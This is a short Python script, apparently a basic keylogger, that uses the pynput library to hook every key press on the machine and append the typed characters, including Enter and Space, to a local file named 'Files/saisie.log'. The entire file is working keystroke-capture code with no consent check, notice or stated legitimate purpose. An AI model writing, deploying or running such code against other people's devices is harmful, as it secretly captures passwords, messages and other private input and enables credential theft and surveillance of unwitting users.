from pynput import keyboard

def clavier(key):
    try:
        phrase = key.char
    except AttributeError:
        if str(key) == 'Key.enter':
            phrase = '\n'
        elif str(key) == 'Key.space':
            phrase = ' '
        else:
            phrase = str(key)
        
    with open("Files/saisie.log", mode='a') as file:
            file.write(phrase)

listener = keyboard.Listener(on_press=clavier)
listener.start()
listener.join()